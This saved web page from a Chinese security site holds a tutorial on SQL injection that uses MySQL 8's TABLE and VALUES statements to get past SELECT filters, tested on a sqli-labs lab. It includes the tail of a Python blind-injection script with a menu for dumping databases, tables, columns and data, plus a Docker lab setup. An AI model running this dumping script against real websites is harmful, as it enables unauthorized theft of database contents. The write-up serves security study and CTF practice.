+                    name += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)
+                    <span class="hljs-built_in">print</span>(name)
+                    <span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入要操作的内容：\n1.爆当前数据库\n2.爆数据表开始行号\n3.爆数据表\n4.爆字段值开始行号\n5.爆字段值\n6.爆数据\n7.爆所有数据库"</span>)
+        types = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())
+        <span class="hljs-keyword">if</span> types == <span class="hljs-number">1</span>:
+            current_db(url)
+        <span class="hljs-keyword">elif</span> types == <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> types == <span class="hljs-number">3</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入已经得到的数据库名:"</span>,end=<span class="hljs-string">''</span>)
+            database = <span class="hljs-built_in">input</span>()
+            <span class="hljs-keyword">if</span> types == <span class="hljs-number">2</span>:
+                tables_n(url,database)
+            <span class="hljs-keyword">elif</span> types == <span class="hljs-number">3</span>:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">"爆数据表开始行号:"</span>,end=<span class="hljs-string">''</span>)
+                n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())
+                tables(url,database,n)
+        <span class="hljs-keyword">elif</span> types == <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> types == <span class="hljs-number">5</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入已经得到的数据库名:"</span>,end=<span class="hljs-string">''</span>)
+            database = <span class="hljs-built_in">input</span>()
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入已经得到的数据表名:"</span>,end=<span class="hljs-string">''</span>)
+            table = <span class="hljs-built_in">input</span>()
+            <span class="hljs-keyword">if</span> types == <span class="hljs-number">4</span>:
+                columns_n(url,database,table)
+            <span class="hljs-keyword">elif</span> types == <span class="hljs-number">5</span>:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">"爆字段值开始行号:"</span>,end=<span class="hljs-string">''</span>)
+                n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())
+                columns(url,database,table,n)
+        <span class="hljs-keyword">elif</span> types == <span class="hljs-number">6</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"请输入要查询的数据表名:"</span>,end=<span class="hljs-string">''</span>)
+            table = <span class="hljs-built_in">input</span>()
+            datas(url,table)
+        <span class="hljs-keyword">else</span>:
+            dbs(url)
+</code></pre>
+<p>经测试基本没有问题。上边脚本是get型传参，且参数名为id的脚本。可根据实际情况进行修改。</p>
+<p>&nbsp;</p>
+<h2 name="h2-12" id="h2-12">0x06 CTF题目实战</h2>
+<p>暂时没有找到题目环境，找到后再总结<br>
+参考：<br><a href="https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&amp;mid=2247489077&amp;idx=1&amp;sn=cd865192382b67c21ab6835dea99c94d&amp;chksm=f9e000a4ce9789b2263e9cd8025c711687c4b6c5f22bb0e7854d77c124cf98d579616fb22377&amp;mpshare=1&amp;scene=23&amp;srcid=1209qvPhLi3qrPCHX4DAMjRN&amp;sharer_sharetime=1607478296433&amp;sharer_shareid=9a768428f445de7c9f085723c18fd735#rd">RoarCTF部分题目WP</a></p>
+<p>&nbsp;</p>
+<h2 name="h2-13" id="h2-13">0x07 后记</h2>
+<p>上面记录了mysql8新特性的sql注入。可能会有个别不恰当之处，欢迎大师傅批评指正！</p>
+<p>参考：<br><a href="https://xz.aliyun.com/t/8646">MYSQL8.0注入新特性</a><br><a href="https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html">利用MySQL8新特性绕过select过滤</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&amp;mid=2247489077&amp;idx=1&amp;sn=cd865192382b67c21ab6835dea99c94d&amp;chksm=f9e000a4ce9789b2263e9cd8025c711687c4b6c5f22bb0e7854d77c124cf98d579616fb22377&amp;mpshare=1&amp;scene=23&amp;srcid=1209qvPhLi3qrPCHX4DAMjRN&amp;sharer_sharetime=1607478296433&amp;sharer_shareid=9a768428f445de7c9f085723c18fd735#rd">RoarCTF部分题目WP</a></p>
+
+</div><div class="_53" style="display: none;"> 本文翻译自 <a href="https://www.anquanke.com/post/id/231627" target="_blank">原文链接</a>。如若转载请注明出处。 </div><div class="_206" style="display: none;"> 商务合作，文章发布请联系 anquanke@360.cn </div><div class="_59"><p> 本文由<b>Qwzf</b>原创发布 </p><p> 转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/231627" target="_blank">https://www.anquanke.com/post/id/231627</a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_62" style="display: none;"><p> 本文转载自: <a href="https://www.anquanke.com/post/id/231627"></a></p><p> 如若转载,请注明出处： <a href="https://www.anquanke.com/post/id/231627" target="_blank"></a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_63 share1"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/231627" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABG1JREFUeF7tnet64jAMRMP7PzT9SKFNDFKOPI5L29mfu74eSyNZBvayLMt1Gfznev0e8nK5hKNv21WXkI1bHYuutzrutv2NgkFDwzBohcDN0maDHuXKyjgZs0guovm27ds20b9lfSrn2a51Jx0KoFELNOiD4zToPSBs0SSqR9pG/r49NzJfdNZEOtq+pE9Vu7P2oXSQjROg1NLJfAa9LIsaXAw60eaqRWfuSy3/KPLTcaqGQQzhbaTDoO8ERok/HYd4xJEFZ0E1S1f/lUWT4Eal4DEWcfFb2z+ddVDrVCzdoCnlpPZAbq6/DnSBy9qUuHgLQXFfpe/soLzy2ZZJicVEB2DQnVdwW3QcMAmbtNZBBiBtaDBTUiwyh1omJXulbaa+sKg14VEHk8UUGkwp4K+0c+ZT1r8GfVUiYPFYs6yDWGtxurT5xG1/ZmUGPfL44rEMeg7nfR5N5lQuCj3uGgUnso7tfnoKTNv+JEjiMqlBs2JTxMmgk2pdb/ngFewUNAmGqtsQCyDepLShGQ+Zg0jg083QoPcFMYMmBJI2tmgRIO3+VqCJFpONEQ0j47RtekqxjzFmrClLJ3cXFoOuHz/N8w26znbXQwat1HuJi2eyoOy9emOkc1WlJ03vSAVNOYBsU2fLljq+QTen97YWrTzOUn16sKApFrGeGRZKPBwXrgw6FjSDbj5HQgMatb5XHkg+T5iWYqNaR1UWos32uPgZATeTre3aqxkT3V/4wmLQ7HMdBt242FtZNBF/JX0i2cSNT3Ud1KqIlhPZiqQmvSdsNbq6weqEBn0nZtDx15UVT169tPrCQlyLHFjrZkr6RDKFHnkhe6UZi0EnwmrQSUahunh0qal6TbuOsB5ddeUe14yMiQbN3htclh1UD4pavUGL1T+D7qyHTLFoEkHJ1ZzoWc8jAJEzWjgia+zJnh7zpxpt0PvjN2goC2nZcvPrZUQuVG+Sfq9jVNbQ1jeI+6sSRrIkkv0QCVr3F72wkIUYNPsiq0EflPOGWvTZLyxZha+qjaTMqXgirb/Q3Hm3d4OOj48AxRpt0Aa9EiA6mckTkRsS1ElOjV/ByWDVhVNQRFvJWGSc6h5oe4OmpMR2Bi0CpN0xaDpgpV3myiS9I/oZtckyApotPMZWJQk9ZVXAtm0N+pOIQcPMRrbos3+vY2TqpUhN5pXVi8l2LNJ3tWiDZp/lkKuFBv0DoMmFoCfCR5F71HyRK2dyMSrr6JKOURunWjpqPoNuTKrVOYPueJMjrkhz6hk1FyVdI++HT6/gylMW1SdyuyJjjYKzplvJfy11dEEz6ITQk4X9NdCK5dy49VjPkUVmZQIyHwm+7b6lV/Cz3d2g70dq0PxXxaZaNNVJcoDVGko2N8n7q21+VDoM+kAKSPGd5L4G/QL0jMitSIRyq2zzaCILirE9lUmVxROLbhdr0FVzht92NegOsOqLRU8Jk3gN9Uq1kP9q/elj8NmFf1Js6rmpVWUnmyO66VXXbtAvzM8WDfX+t1n0B4ARyubeYs3ZAAAAAElFTkSuQmCC" style="display: block;"></div></div><ul class="_65"><li><a target="_blank" href="https://www.anquanke.com/tag/CTF">CTF</a></li><li><a target="_blank" href="https://www.anquanke.com/tag/Web%E5%AE%89%E5%85%A8">Web安全</a></li><li><a target="_blank" href="https://www.anquanke.com/tag/%E5%8F%8C%E5%80%8D%E6%B4%BB%E5%8A%A8">双倍活动</a></li></ul><div class="_56"><div class="line line1"><div class="_18 item1"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">34赞</span></div><div class="_12 item1"><i class=""></i><span>收藏</span></div></div><div class="line line2"><div class="user"><img class="avatar" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t011e0b65c0df998c20.png"><span class="name">Qwzf</span><span class="label label-verify"></span></div><div class="_63 share2"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/231627" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABG1JREFUeF7tnet64jAMRMP7PzT9SKFNDFKOPI5L29mfu74eSyNZBvayLMt1Gfznev0e8nK5hKNv21WXkI1bHYuutzrutv2NgkFDwzBohcDN0maDHuXKyjgZs0guovm27ds20b9lfSrn2a51Jx0KoFELNOiD4zToPSBs0SSqR9pG/r49NzJfdNZEOtq+pE9Vu7P2oXSQjROg1NLJfAa9LIsaXAw60eaqRWfuSy3/KPLTcaqGQQzhbaTDoO8ERok/HYd4xJEFZ0E1S1f/lUWT4Eal4DEWcfFb2z+ddVDrVCzdoCnlpPZAbq6/DnSBy9qUuHgLQXFfpe/soLzy2ZZJicVEB2DQnVdwW3QcMAmbtNZBBiBtaDBTUiwyh1omJXulbaa+sKg14VEHk8UUGkwp4K+0c+ZT1r8GfVUiYPFYs6yDWGtxurT5xG1/ZmUGPfL44rEMeg7nfR5N5lQuCj3uGgUnso7tfnoKTNv+JEjiMqlBs2JTxMmgk2pdb/ngFewUNAmGqtsQCyDepLShGQ+Zg0jg083QoPcFMYMmBJI2tmgRIO3+VqCJFpONEQ0j47RtekqxjzFmrClLJ3cXFoOuHz/N8w26znbXQwat1HuJi2eyoOy9emOkc1WlJ03vSAVNOYBsU2fLljq+QTen97YWrTzOUn16sKApFrGeGRZKPBwXrgw6FjSDbj5HQgMatb5XHkg+T5iWYqNaR1UWos32uPgZATeTre3aqxkT3V/4wmLQ7HMdBt242FtZNBF/JX0i2cSNT3Ud1KqIlhPZiqQmvSdsNbq6weqEBn0nZtDx15UVT169tPrCQlyLHFjrZkr6RDKFHnkhe6UZi0EnwmrQSUahunh0qal6TbuOsB5ddeUe14yMiQbN3htclh1UD4pavUGL1T+D7qyHTLFoEkHJ1ZzoWc8jAJEzWjgia+zJnh7zpxpt0PvjN2goC2nZcvPrZUQuVG+Sfq9jVNbQ1jeI+6sSRrIkkv0QCVr3F72wkIUYNPsiq0EflPOGWvTZLyxZha+qjaTMqXgirb/Q3Hm3d4OOj48AxRpt0Aa9EiA6mckTkRsS1ElOjV/ByWDVhVNQRFvJWGSc6h5oe4OmpMR2Bi0CpN0xaDpgpV3myiS9I/oZtckyApotPMZWJQk9ZVXAtm0N+pOIQcPMRrbos3+vY2TqpUhN5pXVi8l2LNJ3tWiDZp/lkKuFBv0DoMmFoCfCR5F71HyRK2dyMSrr6JKOURunWjpqPoNuTKrVOYPueJMjrkhz6hk1FyVdI++HT6/gylMW1SdyuyJjjYKzplvJfy11dEEz6ITQk4X9NdCK5dy49VjPkUVmZQIyHwm+7b6lV/Cz3d2g70dq0PxXxaZaNNVJcoDVGko2N8n7q21+VDoM+kAKSPGd5L4G/QL0jMitSIRyq2zzaCILirE9lUmVxROLbhdr0FVzht92NegOsOqLRU8Jk3gN9Uq1kP9q/elj8NmFf1Js6rmpVWUnmyO66VXXbtAvzM8WDfX+t1n0B4ARyubeYs3ZAAAAAElFTkSuQmCC" style="display: block;"></div></div></div></div></div><div class="_60"><h2 class="g-title">推荐阅读</h2><ul><li><a href="https://www.anquanke.com/post/id/289260"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01ecfc10734bb0a594.jpg"><h5 class="g-line2">RBAC 和 Keto（Go RBAC 框架）</h5><p>2023-06-16 18:31:25</p></a></li><li><a href="https://www.anquanke.com/post/id/289299"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01631accaaecf8e083.jpg"><h5 class="g-line2">API NEWS | Booking.com爆出API漏洞</h5><p>2023-06-16 17:57:51</p></a></li><li><a href="https://www.anquanke.com/post/id/289298"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t010bea9d3bd19acbe5.jpg"><h5 class="g-line2">RBAC 和 Keto（Go RBAC 框架）</h5><p>2023-06-16 17:57:09</p></a></li><li><a href="https://www.anquanke.com/post/id/289234"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01541abcaaa3b796e4.jpg"><h5 class="g-line2">案例分享 | 银行API安全解决方案</h5><p>2023-06-16 17:56:08</p></a></li></ul></div><div class="_7 index-comment"><h2 class="g-title">发表评论</h2><div class="login"><p class="login-text">您还未登录，请先登录。</p><p class="login-bar"><a href="https://www.anquanke.com/login/index.html">登录</a></p></div><h2 class="g-title">评论列表</h2><ul class="body"><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=162172" class="body-item-avatar"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t010857340ce46bb672.jpg"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=162172" class="item-main-name">quan9i</a><span class="item-main-time">2022-09-17 00:18</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">0赞</span></div><button>回复</button></div><div class="item-main-content">tqlllllllllll</div><!----><div class="body-item-sub"></div></div></li><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=149903" class="body-item-avatar"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/g"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=149903" class="item-main-name">devil may cry</a><span class="item-main-time">2021-10-08 18:22</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">0赞</span></div><button>回复</button></div><div class="item-main-content">docker ip是如何获取的啊</div><!----><div class="body-item-sub"><div class="body-item"><a class="body-item-avatar"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/g"></a><div class="item-main"><div class="item-main-top"><span class="item-main-name">devil may cry</span><span class="item-main-time">2021-10-08 19:12</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">0赞</span></div></div><div class="item-main-content">别回复了我是傻逼没看清哪里是宿主机</div></div></div></div></div></li><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=153961" class="body-item-avatar"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01efe206ae95ba0ec9.png"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=153961" class="item-main-name">m0re</a><span class="item-main-time">2021-03-25 14:10</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">0赞</span></div><button>回复</button></div><div class="item-main-content">学习了 师傅tql</div><!----><div class="body-item-sub"></div></div></li><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=125501" class="body-item-avatar"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t03a9fe0d91f9bf4c55.jpg"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=125501" class="item-main-name">我是孙大柱</a><span class="item-main-time">2021-03-01 15:12</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">0赞</span></div><button>回复</button></div><div class="item-main-content">太强了，tql，懵神求抱大腿</div><!----><div class="body-item-sub"></div></div></li><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=147205" class="body-item-avatar"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/g(1)"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=147205" class="item-main-name">南北</a><span class="item-main-time">2021-03-01 12:49</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">1赞</span></div><button>回复</button></div><div class="item-main-content">大师傅，膜拜了</div><!----><div class="body-item-sub"></div></div></li><li class="body-item"><a href="https://www.anquanke.com/member.html?memberId=141811" class="body-item-avatar"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t015b53550d07592c19.png"></a><div class="item-main"><div class="item-main-top"><a href="https://www.anquanke.com/member.html?memberId=141811" class="item-main-name">Sn0w</a><span class="item-main-time">2021-03-01 12:48</span><div class="_18 rate"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">1赞</span></div><button>回复</button></div><div class="item-main-content">太强了，tql</div><!----><div class="body-item-sub"></div></div></li></ul><!----></div></div><div class="index-side"><div class="index-side-top"><div class="_66"><img class="banner" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t014757b72460d855bf.png"><div class="w"><a class="avatar" href="https://www.anquanke.com/member.html?memberId=148279"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t011e0b65c0df998c20.png"></a><p class="info"><a href="https://www.anquanke.com/member.html?memberId=148279" class="name">Qwzf</a><a href="https://www.anquanke.com/member.html?memberId=148279" class="user-label user-label-verify"></a></p><p class="hint">这个人太懒了，签名都懒得写一个</p><div class="bottom"><ul class="bottom-1"><li>文章</li><li><strong>3</strong></li></ul><ul class="bottom-2"><li>粉丝</li><li><strong>8</strong></li></ul><div class="spacer"></div><!----></div></div></div><div class="_64"><h3 class="title"> TA的文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/241808">浅谈命令执行的绕过方法</a></h5><p>2021-05-30 10:00:17</p></li><li><h5><a href="https://www.anquanke.com/post/id/231627">浅谈利用mysql8新特性进行SQL注入</a></h5><p>2021-03-01 10:00:17</p></li><li><h5><a href="https://www.anquanke.com/post/id/219107">浅谈解析漏洞的利用与防范</a></h5><p>2020-10-20 14:30:40</p></li></ul></div><div class="_61"><h3 class="title"> 相关文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/288353">培养云上安全人才 | 阿里云2023首届CTF大赛重磅启动</a></h5><p>2023-04-24 19:17:46</p></li><li><h5><a href="https://www.anquanke.com/post/id/286967">Ichunqiu云境 —— Exchange Writeup</a></h5><p>2023-03-03 14:30:36</p></li><li><h5><a href="https://www.anquanke.com/post/id/284201">Ichunqiu云境 - Delegation Writeup</a></h5><p>2023-01-06 10:30:50</p></li><li><h5><a href="https://www.anquanke.com/post/id/284260">Ichunqiu云境 —— Tsclient Writeup</a></h5><p>2023-01-05 10:30:31</p></li><li><h5><a href="https://www.anquanke.com/post/id/284307">活动 | 长亭科技2023第五届 Real World CTF 战火已燃，等你来战！</a></h5><p>2022-12-21 17:00:34</p></li><li><h5><a href="https://www.anquanke.com/post/id/283073">从一道题入门 UEFI PWN</a></h5><p>2022-11-11 15:30:05</p></li><li><h5><a href="https://www.anquanke.com/post/id/282335">2022年工业信息安全技能大赛“望岳杯”锦标赛 wp</a></h5><p>2022-10-31 15:30:36</p></li></ul></div><div class="_52"><h3 class="title">热门推荐</h3><ul></ul></div></div><div class="_57"><div class="wrap"><div class="title">文章目录</div><ul class="list"><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-0">0x00 前言</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-1">0x01 MySQL8介绍</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-2">0x02 基本环境配置</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/231627#h3-3">1、搭建MySQL8环境</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/231627#h3-4">2、搭建SQL注入环境</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-5">0x03 MySQL8语法新特性</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/231627#h3-6">1、TABLE statement</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/231627#h3-7">2、VALUES statement</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-8">0x04 利用MySQL8新特性绕过select</a><ul><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/231627#h3-9">1、在mysql命令终端测试</a></li><li class="subitem"><a class="g-line1" href="https://www.anquanke.com/post/id/231627#h3-10">2、在sqli-labs靶场测试</a></li></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-11">0x05 脚本编写</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-12">0x06 CTF题目实战</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231627#h2-13">0x07 后记</a><ul></ul></li></ul></div></div></div></div><div class="_8"><div class="g-w main"><div class="col1"><p class="col1-logo"><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t018717b31ed82fff86.png"></p><div class="col1-link"><b class="col1-weixin"></b><a href="https://weibo.com/360adlab" class="col1-sina"></a><a href="https://zhuanlan.zhihu.com/c_118578260" class="col1-zhi"></a></div></div><div class="col2"><div class="title">安全客</div><ul class="col2-list"><li><a href="https://www.anquanke.com/about" rel="noopener noreferrer" target="_blank">关于我们</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a></li><li><a href="https://www.anquanke.com/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a></li></ul></div><div class="col3"><div class="title">商务合作</div><ul class="col3-list"><li><a href="https://www.anquanke.com/note/business" target="_blank" rel="noopener noreferrer">合作内容</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a></li><li><a href="https://www.anquanke.com/link" target="_blank" rel="noopener noreferrer">友情链接</a></li></ul></div><div class="col4"><div class="title">内容需知</div><ul><li><a href="https://www.anquanke.com/contribute/tips" target="_blank" rel="noopener noreferrer">投稿须知</a></li><li><a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a></li><li>官网QQ群8：819797106</li><li>官网QQ群3：830462644(已满)</li><li>官网QQ群2：814450983(已满)</li><li>官网QQ群1：702511263(已满)</li></ul></div><div class="col5"><div class="title">合作单位</div><ul><li><a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t01592a959354157bc0.png" style="max-height: 40px;"></a></li><li style="margin-top: -20px;"><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t014f76fcea94035e47.png" style="max-height: 50px; margin-top: 10px;"></a></li></ul></div></div><div class="right g-w"><span>Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved </span><a href="https://beian.miit.gov.cn/">京ICP备08010314号-66</a><span id="cnzz_stat_icon_1271278035"><a href="https://www.cnzz.com/stat/website.php?web_id=1271278035" target="_blank" title="站长统计"><img border="0" hspace="0" vspace="0" src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/pic.gif" x60yzajxv=""></a></span></div><div class="layer" style="display: none;"><div class="layer-main"><div class="layer-title">微信二维码</div><b class="layer-close">X</b><img src="./浅谈利用mysql8新特性进行SQL注入-安全客 - 安全资讯平台_files/t0151209205b47f2270.jpg" alt="安全客"></div></div></div></div><script>window.__state__={"artical":{"post":{"id":231627,"title":"浅谈利用mysql8新特性进行SQL注入","category_name":"安全知识","category_slug":"knowledge","desc":"前段时间遇到一个题考查的是mysql8的table注入。当时没有做出来。之前有了解过mysql8的table注入，但做题的时候没有想到。这里简单总结复现一下mysql8新特性的sql注入。","date":"2021-03-01 10:00:17","time_interval":"2021-03-01","status":"publish","comment":7,"cover":"https://p1.ssl.qhimg.com/t01fa599e3b29e2aff9.png","subject":false,"red":true,"type":"origin","url":"","source":"","fee":"800","origin_author":"","pv":278988,"like_count":34,"liked":0,"tags":["CTF","Web安全","双倍活动"],"is_favorite":false,"favorite_count":25,"content":"<html>\n<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head>\n<body>\n<p><img class=\"alignnone size-full wp-image-232304 aligncenter\" alt=\"\" width=\"720\" height=\"360\" data-original=\"https://p1.ssl.qhimg.com/t01fa599e3b29e2aff9.png\"></p>\n<p> </p>\n<h2 name=\"h2-0\" id=\"h2-0\">0x00 前言</h2>\n<p>前段时间遇到一个题考查的是mysql8的table注入。当时没有做出来。之前有了解过mysql8的table注入，但做题的时候没有想到。这里简单总结复现一下mysql8新特性的sql注入。</p>\n<p> </p>\n<h2 name=\"h2-1\" id=\"h2-1\">0x01 MySQL8介绍</h2>\n<p>在ubuntu20 apt源中集成了mysql 8.0.20。官方表示MySQL8要比MySQL5.7快2倍，支持json,nosql，修改了默认身份验证等其他改进。</p>\n<p> </p>\n<h2 name=\"h2-2\" id=\"h2-2\">0x02 基本环境配置</h2>\n<h3 name=\"h3-3\" id=\"h3-3\">\n<a class=\"reference-link\" name=\"1%E3%80%81%E6%90%AD%E5%BB%BAMySQL8%E7%8E%AF%E5%A2%83\"></a>1、搭建MySQL8环境</h3>\n<p>最简单的方法，就是使用docker拉取镜像搭建</p>\n<pre><code class=\"lang-bash\">docker pull mysql:8.0.21\r\ndocker run -d --name=mysql8 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.21\r\n</code></pre>\n<h3 name=\"h3-4\" id=\"h3-4\">\n<a class=\"reference-link\" name=\"2%E3%80%81%E6%90%AD%E5%BB%BASQL%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83\"></a>2、搭建SQL注入环境</h3>\n<p>1.下载vulstudy综合环境：<a href=\"https://github.com/c0ny1/vulstudy\">https://github.com/c0ny1/vulstudy</a><br>\n2.启动vulstudy综合环境里的sql注入的靶场<br>\n3.进入容器修改sqli-lab的配置文件：</p>\n<pre><code class=\"lang-bash\">#安装vim\r\nsed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list\r\napt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get install vim\r\n#修改sqli-lab的配置文件\r\nvim /app/sql-connections/db-creds.inc\r\n</code></pre>\n<p>填写mysql相关连接信息，数据库的IP填宿主机IP(我这里是172.30.102.102)</p>\n<p><img class=\"alignnone size-full wp-image-232293 aligncenter\" alt=\"\" width=\"436\" height=\"197\" data-original=\"https://p5.ssl.qhimg.com/t015736d456f85fb604.png\"></p>\n<p>4.然后在mysql8容器里通过下面sql语句修改默认认证方式(因为mysql8.0默认认证方式和5不一样)：</p>\n<pre><code class=\"lang-sql\">ALTER USER 'root' IDENTIFIED WITH mysql_native_password BY '123456';\r\n</code></pre>\n<p>5.重新配置数据库，环境搭建完成。</p>\n<p> </p>\n<h2 name=\"h2-5\" id=\"h2-5\">0x03 MySQL8语法新特性</h2>\n<p>在MySQL 8.0.19之后，MySQL推出几种新语法</p>\n<h3 name=\"h3-6\" id=\"h3-6\">\n<a class=\"reference-link\" name=\"1%E3%80%81TABLE%20statement\"></a>1、TABLE statement</h3>\n<p><strong>TABLE statement</strong><br><strong>作用</strong>：列出表中全部内容</p>\n<pre><code class=\"lang-sql\">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]\r\n</code></pre>\n<p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>\n支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。<br><strong>例子</strong>：<br>\n首先选择mysql数据库：<code>use security;</code></p>\n<pre><code class=\"lang-sql\">mysql&gt; TABLE users;\r\n+----+----------+------------+\r\n| id | username | password   |\r\n+----+----------+------------+\r\n|  1 | Dumb     | Dumb       |\r\n|  2 | Angelina | I-kill-you |\r\n|  3 | Dummy    | p@ssword   |\r\n|  4 | secure   | crappy     |\r\n|  5 | stupid   | stupidity  |\r\n|  6 | superman | genious    |\r\n|  7 | batman   | mob!le     |\r\n|  8 | admin    | admin      |\r\n|  9 | admin1   | admin1     |\r\n| 10 | admin2   | admin2     